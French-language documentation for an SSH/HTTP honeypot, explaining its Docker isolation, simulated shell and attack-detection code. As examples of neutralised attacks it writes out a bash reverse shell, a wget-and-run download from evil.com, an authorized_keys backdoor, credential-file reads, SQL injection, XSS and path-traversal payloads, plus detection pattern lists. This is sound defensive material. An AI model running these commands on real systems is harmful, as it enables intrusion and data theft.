# 🔒 Honeypot Security Documentation

## Table des Matières
1. [Vue d'ensemble de la sécurité](#vue-densemble-de-la-sécurité)
2. [Isolation et Containérisation](#isolation-et-containérisation)
3. [Protection contre les attaques](#protection-contre-les-attaques)
4. [Mécanismes de sécurité](#mécanismes-de-sécurité)
5. [Exemples de protection](#exemples-de-protection)
6. [Meilleures pratiques](#meilleures-pratiques)

---

## Vue d'ensemble de la sécurité

Ce honeypot est conçu avec plusieurs couches de sécurité pour **attraper les attaquants sans compromettre votre système**. Voici comment il est sécurisé:

### Architecture de Sécurité Multicouche

```
┌─────────────────────────────────────────┐
│  Attaquant                              │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  🛡️ Couche 1: Isolation Docker         │
│  - Conteneur isolé du système hôte     │
│  - Pas d'accès au système réel          │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  🛡️ Couche 2: Environnement Factice    │
│  - Shell simulé (pas de vrai shell)     │
│  - Filesystem virtuel                   │
│  - Commandes simulées                   │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  🛡️ Couche 3: Surveillance Active      │
│  - Logging de toutes les actions        │
│  - Détection d'anomalies                │
│  - Alertes en temps réel                │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  🛡️ Couche 4: Limitation des Ressources│
│  - Timeouts sur toutes les opérations   │
│  - Limite de connexions simultanées     │
│  - Limite de taille des uploads         │
└─────────────────────────────────────────┘
```

---

## Isolation et Containérisation

### ✅ 1. Isolation Docker Complète

Le honeypot fonctionne dans un conteneur Docker **complètement isolé** du système hôte:

```yaml
# docker-compose.yml
services:
  honeypot:
    # Réseau isolé - pas d'accès au réseau hôte
    networks:
      - honeypot-network

    # Volumes read-only pour les fichiers de configuration
    volumes:
      - ./logs:/root/logs
      - ./data:/root/data
      - ./uploads:/root/uploads
```

**Protection:**
- ❌ L'attaquant **NE PEUT PAS** accéder à votre système hôte
- ❌ L'attaquant **NE PEUT PAS** voir vos fichiers réels
- ❌ L'attaquant **NE PEUT PAS** exécuter de vraies commandes système
- ✅ Tout se passe dans un environnement virtuel isolé

### ✅ 2. Aucun Accès Root Réel

Le conteneur n'a **AUCUN privilège élevé**:

```dockerfile
# Dockerfile
FROM alpine:latest
# Pas de --privileged
# Pas de CAP_SYS_ADMIN
# Utilisateur non-root dans le conteneur
```

**Protection:**
- ❌ Même si un attaquant pense obtenir "root", c'est un faux root
- ✅ Aucun accès aux capacités système réelles
- ✅ Impossible d'échapper du conteneur

---

## Protection contre les Attaques

### 🛡️ 1. Shell Complètement Simulé

**Code (internal/honeypot/fake_session.go):**
```go
// Toutes les commandes sont SIMULÉES - aucune vraie exécution
func (s *FakeSession) executeFakeCommand(command string) string {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return ""
	}

	cmd := parts[0]

	switch cmd {
	case "rm":
		// ✅ NE SUPPRIME RIEN - juste retourne un message
		return s.fakeRm(args)
	case "wget":
		// ✅ NE TÉLÉCHARGE RIEN - juste retourne un message
		return s.fakeWget(args)
	case "sudo":
		// ✅ NE DONNE PAS DE PRIVILÈGES - juste simule
		return s.fakeSudo(args)
	}
}
```

**Exemple d'attaque neutralisée:**
```bash
# L'attaquant essaie de détruire le système:
attacker@honeypot:~$ rm -rf /
# ✅ Aucun fichier n'est supprimé - tout est simulé
# ✅ La commande est enregistrée pour analyse
# ✅ Une alerte est envoyée
```

### 🛡️ 2. Protection contre l'Exécution de Code Arbitraire

**Code (internal/honeypot/fake_session.go):**
```go
// Commandes dangereuses sont interceptées et simulées
case "python", "python3":
	// ✅ NE LANCE PAS PYTHON - juste simule
	return s.fakePython(args)
case "bash":
	// ✅ NE LANCE PAS BASH - juste simule
	return s.fakeBash(args)
case "wget", "curl":
	// ✅ NE TÉLÉCHARGE RIEN - juste simule
	return s.fakeWget(args)
```

**Exemple d'attaque neutralisée:**
```bash
# L'attaquant essaie d'exécuter du code malveillant:
attacker@honeypot:~$ python -c 'import os; os.system("cat /etc/passwd")'
# ✅ Python n'est PAS exécuté réellement
# ✅ Retourne une fausse réponse
# ✅ Alerte CRITICAL envoyée
```

### 🛡️ 3. Protection contre les Reverse Shells

**Code (internal/honeypot/alerts.go):**
```go
// Détection automatique des tentatives de reverse shell
func (am *AlertManager) analyzeDangerLevel(command string) string {
	cmd := strings.ToLower(command)

	// Commandes hautement suspectes
	highPatterns := []string{
		"nc -",        // netcat reverse shell
		"netcat",
		"/bin/bash -i",  // interactive bash
		"bash -i",
		"/dev/tcp",    // bash reverse shell
	}

	for _, pattern := range highPatterns {
		if strings.Contains(cmd, pattern) {
			// ✅ Alerte HIGH envoyée immédiatement
			return "high"
		}
	}
}
```

**Exemple d'attaque neutralisée:**
```bash
# L'attaquant essaie un reverse shell:
attacker@honeypot:~$ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
# ✅ La commande est SIMULÉE - aucune connexion sortante
# ✅ Alerte HIGH envoyée
# ✅ IP de l'attaquant enregistrée
# ✅ Commande complète capturée
```

### 🛡️ 4. Protection contre les Injections SQL (HTTP Honeypot)

**Code (internal/services/http/vulnerability_detector.go):**
```go
// Détection des injections SQL
func (vd *VulnerabilityDetector) detectSQLInjection(payload string) bool {
	sqlPatterns := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"UNION SELECT",
		"; DROP TABLE",
		"' AND '1'='1",
	}

	lowerPayload := strings.ToLower(payload)
	for _, pattern := range sqlPatterns {
		if strings.Contains(lowerPayload, strings.ToLower(pattern)) {
			// ✅ Injection détectée et enregistrée
			return true
		}
	}
	return false
}
```

**Exemple d'attaque neutralisée:**
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=anything
```
```
✅ Requête acceptée (pour leurrer l'attaquant)
✅ Injection SQL détectée et enregistrée
✅ Fausse réponse de connexion réussie
✅ Aucune vraie base de données compromise
```

### 🛡️ 5. Protection contre les XSS (HTTP Honeypot)

**Code (internal/services/http/vulnerability_detector.go):**
```go
// Détection des XSS
func (vd *VulnerabilityDetector) detectXSS(payload string) bool {
	xssPatterns := []string{
		"<script",
		"javascript:",
		"onerror=",
		"onload=",
		"<iframe",
	}

	lowerPayload := strings.ToLower(payload)
	for _, pattern := range xssPatterns {
		if strings.Contains(lowerPayload, pattern) {
			// ✅ XSS détecté et enregistré
			return true
		}
	}
	return false
}
```

**Exemple d'attaque neutralisée:**
```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
```
```
✅ Requête capturée
✅ XSS détecté et enregistré
✅ Attaque enregistrée dans la base de données
✅ Aucun script n'est exécuté
```

---

## Mécanismes de Sécurité

### 🔐 1. Timeouts et Limitations

**Code (internal/honeypot/ssh_server.go):**
```go
config := &ssh.ServerConfig{
	MaxAuthTries:      3,  // Max 3 tentatives d'authentification
	AuthLogCallback:   s.authLogCallback,
	PasswordCallback:  s.passwordCallback,
	ServerVersion:     "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
}

// Timeout de connexion
ConnectionTimeout: 300 * time.Second,  // 5 minutes max
IdleTimeout:      60 * time.Second,   // 1 minute d'inactivité
```

**Protection:**
- ✅ Empêche les attaques par déni de service (DoS)
- ✅ Limite les connexions infinies
- ✅ Force la déconnexion des sessions inactives

### 🔐 2. Limite de Connexions Simultanées

**Code (config.yaml):**
```yaml
server:
  max_connections: 10  # Maximum 10 connexions simultanées
```

**Protection:**
- ✅ Empêche les attaques de type flood
- ✅ Protège les ressources système
- ✅ Maintient le honeypot fonctionnel

### 🔐 3. Isolation des Uploads de Fichiers

**Code (internal/services/http/upload.go):**
```go
// Fichiers uploadés sont isolés et analysés
func (u *UploadApp) HandleRequest(r *http.Request, body string, requestID int) *Response {
	// Limite de taille
	r.ParseMultipartForm(10 << 20) // 10MB max

	// Sauvegarde dans un dossier isolé (quarantaine)
	quarantinePath := filepath.Join(u.config.Applications.Upload.QuarantineDir, filename)

	// ✅ Fichiers ne sont JAMAIS exécutés
	// ✅ Hashes MD5/SHA256 calculés pour analyse
	// ✅ Peuvent être analysés avec VirusTotal (si API key configurée)
}
```

**Protection:**
- ✅ Les fichiers uploadés sont en quarantaine
- ✅ Jamais exécutés automatiquement
- ✅ Analysés pour détecter les malwares
- ✅ Hashes disponibles pour partage avec la communauté de sécurité

### 🔐 4. Pas de Vraies Credentials

**Code (config.yaml):**
```yaml
auth:
  fake_users:
    - username: "admin"
      password: "admin123"  # ✅ Credentials FACTICES
    - username: "root"
      password: "password"  # ✅ NE DONNENT PAS ACCÈS AU VRAI SYSTÈME
```

**Protection:**
- ✅ Même avec les bons credentials, l'attaquant n'accède qu'au shell factice
- ✅ Aucune vraie authentification système
- ✅ Impossible de compromettre de vrais comptes

---

## Exemples de Protection

### Exemple 1: Tentative de Vol de Credentials

**Attaque:**
```bash
ssh admin@honeypot -p 2222
# Password: admin123
admin@honeypot:~$ cat /etc/shadow
```

**Protection:**
```
✅ Connexion acceptée (pour leurrer l'attaquant)
✅ Faux contenu de /etc/shadow retourné
✅ Aucun vrai fichier système lu
✅ Alerte MEDIUM envoyée
✅ Commande enregistrée: "cat /etc/shadow"
```

### Exemple 2: Tentative de Backdoor

**Attaque:**
```bash
admin@honeypot:~$ echo "ssh-rsa AAAA... attacker@evil" >> ~/.ssh/authorized_keys
```

**Protection:**
```
✅ Commande simulée - aucun fichier modifié
✅ Système de fichiers est VIRTUEL
✅ Alerte HIGH envoyée
✅ Tentative de backdoor enregistrée
```

### Exemple 3: Tentative de Malware Download

**Attaque:**
```bash
admin@honeypot:~$ wget http://evil.com/malware.sh
admin@honeypot:~$ chmod +x malware.sh
admin@honeypot:~$ ./malware.sh
```

**Protection:**
```
✅ wget est simulé - rien n'est téléchargé
✅ chmod est simulé - aucune permission changée
✅ ./malware.sh est simulé - aucune exécution
✅ Alerte HIGH envoyée pour chaque commande
✅ URL du malware capturée pour analyse
```

### Exemple 4: Tentative de Path Traversal (HTTP)

**Attaque:**
```http
GET /../../../etc/passwd HTTP/1.1
```

**Protection:**
```
✅ Path traversal détecté
✅ Faux contenu de /etc/passwd retourné (honeytokens)
✅ Aucun vrai fichier système accessible
✅ Attaque enregistrée dans la base de données
✅ IP de l'attaquant marquée comme malveillante
```

### Exemple 5: Tentative d'Upload de Malware

**Attaque:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data

[malware.exe file content]
```

**Protection:**
```
✅ Fichier accepté (pour analyse)
✅ Sauvegardé en QUARANTAINE (/root/uploads)
✅ MD5/SHA256 calculés
✅ Jamais exécuté
✅ Peut être analysé manuellement ou avec VirusTotal
✅ Alerte envoyée avec les hashes
```

---

## Meilleures Pratiques

### 🔒 Recommandations de Déploiement

1. **Réseau Isolé**
   ```bash
   # Déployez le honeypot sur un réseau séparé
   # NE PAS déployer sur le même réseau que vos serveurs de production
   ```

2. **Surveillance Continue**
   ```bash
   # Consultez régulièrement le dashboard
   http://localhost:8080

   # Vérifiez les logs
   tail -f logs/honeypot.log
   ```

3. **Alertes Email Configurées**
   ```yaml
   # Assurez-vous que les alertes email fonctionnent
   alerts:
     enabled: true
     email:
       # Vérifiez la configuration SMTP
   ```

4. **Mises à Jour Régulières**
   ```bash
   # Mettez à jour régulièrement le honeypot
   git pull
   docker-compose build --no-cache
   docker-compose up -d
   ```

5. **Analyse des Données**
   ```bash
   # Exportez régulièrement les données pour analyse
   sqlite3 data/honeypot.db ".dump" > backup_$(date +%Y%m%d).sql
   ```

### 🚨 Ce que le Honeypot NE PEUT PAS Faire

- ❌ **Bloquer automatiquement** les attaquants (c'est un outil de détection, pas de prévention)
- ❌ **Protéger vos vrais serveurs** (il faut des firewalls et une vraie sécurité réseau)
- ❌ **Garantir 100% d'isolation** dans des cas extrêmes (0-days de Docker, bugs kernel)

### ✅ Ce que le Honeypot FAIT Bien

- ✅ **Détecte et enregistre** toutes les tentatives d'intrusion
- ✅ **Capture les techniques** des attaquants
- ✅ **Fournit des IOCs** (Indicators of Compromise) : IPs, commandes, malwares
- ✅ **Alerte en temps réel** sur les menaces
- ✅ **Isole complètement** les attaquants du système réel

---

## Audit de Sécurité

### ✅ Checklist de Vérification

- [x] Le honeypot fonctionne dans un conteneur Docker isolé
- [x] Toutes les commandes sont simulées (aucune vraie exécution)
- [x] Les timeouts sont configurés sur toutes les opérations
- [x] Les uploads sont en quarantaine et jamais exécutés
- [x] Les alertes email sont fonctionnelles
- [x] Les logs sont persistants (volume Docker)
- [x] La base de données est en lecture seule depuis l'extérieur
- [x] Aucun port privilégié (<1024) n'est utilisé en production
- [x] Le réseau Docker est isolé
- [x] Les credentials sont factices et ne donnent aucun accès réel

---

## Conclusion

Ce honeypot est conçu avec la **sécurité comme priorité absolue**:

1. **Isolation complète** via Docker
2. **Environnement 100% simulé** - aucune vraie commande
3. **Détection active** de toutes les techniques d'attaque
4. **Alertes en temps réel** pour une réponse rapide
5. **Protection multicouche** contre tous types d'attaques

**L'attaquant ne peut JAMAIS:**
- Accéder à votre système hôte
- Exécuter du code réel
- Télécharger ou uploader des fichiers sur votre système
- Compromettre vos données
- Utiliser le honeypot comme rebond pour d'autres attaques

**Vous obtenez:**
- Vision complète des techniques d'attaque
- IPs des attaquants
- Commandes et payloads malveillants
- Malwares pour analyse
- Données précieuses pour améliorer votre sécurité

---

**🛡️ Votre honeypot est sécurisé et prêt à attraper les attaquants!**
